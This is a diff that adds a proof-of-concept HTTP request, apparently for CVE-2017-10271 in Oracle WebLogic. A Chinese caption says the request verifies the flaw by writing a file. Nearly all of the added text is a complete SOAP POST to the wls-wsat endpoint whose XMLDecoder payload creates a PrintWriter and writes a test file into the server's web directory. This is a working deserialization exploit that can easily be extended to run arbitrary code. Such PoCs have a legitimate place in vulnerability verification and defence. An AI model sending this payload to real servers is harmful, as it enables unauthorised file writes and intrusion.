@@ -8,5 +8,25 @@ CVE-2017-10271
 # POC
 通过写入一个文件的形式进行简单验证
 ```
+POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: 192.168.8.148:7001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Content-Type: text/xml
+Content-Length: 756
 
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+      <soapenv:Header>
+        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+         <java version="1.6.0" class="java.beans.XMLDecoder">
+                    <object class="java.io.PrintWriter"> 
+                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
+                        <string>xmldecoder_vul_test</string></void><void method="close"/>
+                    </object>
+            </java>
+        </work:WorkContext>
+      </soapenv:Header>
+      <soapenv:Body/>
+</soapenv:Envelope>
 ```
